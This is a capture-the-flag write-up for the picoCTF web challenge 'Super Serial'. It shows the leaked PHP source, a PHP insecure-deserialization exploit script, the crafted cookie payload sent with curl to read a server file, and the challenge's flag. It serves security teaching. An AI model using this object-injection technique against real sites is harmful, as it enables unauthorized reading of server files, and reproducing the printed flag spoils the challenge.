# Super Serial
Category: Web, 130 points
## Description
> Try to recover the flag stored on this website 
> 
> Hint: The flag is at ../flag
## Solution
The attached website just contains a username and password:
```html
		Username
		Password
	Sign in
```
But if we visit `robots.txt` we get the following:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/Super_Serial]
└─$ curl http://mercury.picoctf.net:3449/robots.txt
User-agent: *
Disallow: /admin.phps
```
`phps` files are PHP source files. However, trying to visit `admin.phps`, we get an error:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/Super_Serial]
└─$ curl http://mercury.picoctf.net:3449/admin.phps
Not Found
```
Well, we do know at least that we have an `index.php`, shall we try `index.phps`?
```console
┌──(user@kali)-[/media/sf_CTFs/pico/Super_Serial]
└─$ curl -s http://mercury.picoctf.net:3449/index.phps
is_guest() || $perm_res->is_admin()) {
                setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
                header("Location: authentication.php");
                die();
        } else {
                $msg = 'Invalid Login.';
        }
}
?>
                                                        Sign In
                                                                        Username
                                                                        Password
                                                                Sign in
```
That's nice, the interesting part is:
```php
is_guest() || $perm_res->is_admin()) {
                setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
                header("Location: authentication.php");
                die();
        } else {
                $msg = 'Invalid Login.';
        }
}
?>
```
In a similar manner, we can retrieve the sources for `cookie.php`:
```php
username = $u;
		$this->password = $p;
	}
	function __toString() {
		return $u.$p;
	}
	function is_guest() {
		$guest = false;
		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}
        function is_admin() {
                $admin = false;
                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
?>
```
And for `authentication.php`:
```php
log_file = $lf;
	}
	function __toString() {
		return $this->read_log();
	}
	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}
	function read_log() {
		return file_get_contents($this->log_file);
	}
}
require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
								Go back to login
```
Now, in order to determine if the user is authorized to access the page, the server creates a `permissions` object from the provided username and password:
```php
$perm_res = new permissions($username, $password);
```
The object will return `is_admin() == TRUE` only if it can find a matching user in the database:
```php
function is_admin() {
		$admin = false;
		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
				if ($rest["admin"] == 1) {
						$admin = true;
				}
		}
		return $admin;
}
```
If so, the server caches the object in a cookie for the next time, by serializing it:
```php
setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
```
And next time, it reads the value directly from this cache:
```php
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```
This is actually very problematic. Since we control the cookie, we can provide a different serialized object and the server would unserialize it for us.
For example, we can use the `access_log` object:
```php
log_file = $lf;
    }
    function __toString() {
        return $this->read_log();
    }
    function append_to_log($data) {
        file_put_contents($this->log_file, $data, FILE_APPEND);
    }
    function read_log() {
        return file_get_contents($this->log_file);
    }
}
$perm_res = new access_log("../flag");
$perm_res_encoded =  urlencode(base64_encode(serialize($perm_res)));
echo $perm_res_encoded;
echo "\n";
?>
```
We instantiate an `access_log` object with `../flag`, which sets `$this->log_file = "../flag"`. Then we serialize the object and feed it to the server via the cookie.
The server will try to run:
```php
$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
$g = $perm->is_guest();
$a = $perm->is_admin();
```
The first line will create an `access_log` with `$this->log_file = "../flag"`, but the second line will throw an exception since this object doesn't have an `is_guest` method. What happens when the exception is thrown? It's caught by:
```php
catch(Error $e){
	die("Deserialization error. ".$perm);
}
```
This code prints an error message and appends the object to it, causing `access_log.__toString()` to be called:
```php
function __toString() {
	return $this->read_log();
}
```
Which in turn calls:
```php
function read_log() {
	return file_get_contents($this->log_file);
}
```
This should give us the flag.
Let's see it in action:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/Super_Serial]
└─$ php -e solve.php
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```
We send this as the cookie and get:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/Super_Serial]
└─$ curl http://mercury.picoctf.net:3449/authentication.php -H "Cookie: login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9;"
Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_b4e3f8b1}
```
The flag: `picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_b4e3f8b1}`